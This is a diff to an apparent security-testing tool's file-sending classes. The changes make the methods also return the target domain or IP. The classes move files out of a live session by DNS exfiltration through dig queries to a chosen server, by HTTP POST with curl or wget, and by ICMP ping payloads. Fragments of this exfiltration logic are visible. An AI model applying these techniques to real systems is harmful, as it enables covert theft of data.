@@ -12,14 +12,14 @@ class SendFileUDP(SendFileBase):
         super().__init__("SendFileUDP", "udp")
 
 
-    def _send_file(self, live_session, file_path: str) -> tuple[str, int]:
+    def _send_file(self, live_session, file_path: str) -> tuple[str, int, str]:
         """
         Send file via DNS exfiltration using base64 encoding and dig (with nslookup/host fallback).
         """
         # Encode file to base64
         encoded_data, encode_status = self._encode_file(live_session, file_path)
         if encode_status != 0:
-            return "Failed to read and encode file", 1
+            return "Failed to read and encode file", 1, ""
         
         # Split into chunks (DNS labels max 63 chars, use 50 for safety)
         chunk_size = 50
@@ -58,7 +58,7 @@ class SendFileUDP(SendFileBase):
             dns_tool = ("dig", f"dig @{dns_server} {{query}} +short 2>&1")
         
         if not dns_tool:
-            return "ERROR: No DNS lookup tools found (dig, nslookup, host, busybox, getent, python3, or perl). Please install one to use DNS/UDP file transfer.", 1
+            return "ERROR: No DNS lookup tools found (dig, nslookup, host, busybox, getent, python3, or perl). Please install one to use DNS/UDP file transfer.", 1, ""
         
         tool_name, tool_cmd_template = dns_tool
         results = []
@@ -72,7 +72,7 @@ class SendFileUDP(SendFileBase):
             
             # Check for command not found errors (shouldn't happen after test, but just in case)
             if "not found" in result.lower() or "command not found" in result.lower():
-                return f"ERROR: {tool_name} command failed: {result}", 1
+                return f"ERROR: {tool_name} command failed: {result}", 1, target_domain
             
             results.append(result)
             # Limit output to first 10 chunks for testing
@@ -81,7 +81,7 @@ class SendFileUDP(SendFileBase):
         
         output = f"Sent {min(len(chunks), 10)} DNS chunks via UDP to {dns_server}\n" + "\n".join(results[:5])
         exit_status = 0
-        return output, exit_status
+        return output, exit_status, target_domain
 
 
 
@@ -96,7 +96,7 @@ class SendFileHTTP(SendFileBase):
     def __init__(self):
         super().__init__("SendFileHTTP", "http")
 
-    def _send_file(self, live_session, file_path: str) -> tuple[str, int]:
+    def _send_file(self, live_session, file_path: str) -> tuple[str, int, str]:
         """
         Send file via HTTP POST using curl, with wget as fallback.
         """
@@ -117,13 +117,15 @@ class SendFileHTTP(SendFileBase):
                 use_curl = False  # Fall back to wget
             else:
                 exit_status = 0 if any(x in output for x in ["200", "201", "success", "OK"]) else 1
-                return output, exit_status
+                # Extract domain from URL (example.com from http://example.com/upload)
+                target_domain = target_url.split("://")[1].split("/")[0]
+                return output, exit_status, target_domain
         
         # Fallback to wget if curl failed or not available
         if not use_curl:
             check_wget = live_session.run_command("which wget 2>&1")
             if "wget" not in check_wget or "not found" in check_wget.lower():
-                return "ERROR: Neither curl nor wget found. Please install one to use HTTP file transfer.", 1
+                return "ERROR: Neither curl nor wget found. Please install one to use HTTP file transfer.", 1, ""
             
             # wget doesn't support multipart/form-data POST like curl, so we'll use --post-file
             # For a more realistic approach, we could base64 encode and send as data
@@ -132,12 +134,14 @@ class SendFileHTTP(SendFileBase):
             
             # Check for wget errors
             if "not found" in output.lower() or "command not found" in output.lower():
-                return f"ERROR: wget command failed: {output}", 1
+                return f"ERROR: wget command failed: {output}", 1, ""
             
             exit_status = 0 if any(x in output for x in ["200", "201", "success", "OK", "saved"]) else 1
-            return output, exit_status
+            # Extract domain from URL (example.com from http://example.com/upload)
+            target_domain = target_url.split("://")[1].split("/")[0]
+            return output, exit_status, target_domain
         
-        return "ERROR: Failed to send file", 1
+        return "ERROR: Failed to send file", 1, ""
 
 
 class SendFileICMP(SendFileBase):
@@ -151,13 +155,13 @@ class SendFileICMP(SendFileBase):
     def __init__(self):
         super().__init__("SendFileICMP", "icmp")
 
-    def _send_file(self, live_session, file_path: str) -> tuple[str, int]:
+    def _send_file(self, live_session, file_path: str) -> tuple[str, int, str]:
         """
         Send file via ICMP exfiltration using ping with data payload.
         """
         encoded_data, encode_status = self._encode_file(live_session, file_path)
         if encode_status != 0:
-            return "Failed to read and encode file", 1
+            return "Failed to read and encode file", 1, ""
         
         chunk_size = 32
         chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
@@ -172,5 +176,5 @@ class SendFileICMP(SendFileBase):
         
         output = f"Sent {min(len(chunks), 10)} ICMP packets to {target_ip}\n" + "\n".join(results[:3])
         exit_status = 0
-        return output, exit_status
+        return output, exit_status, target_ip
 
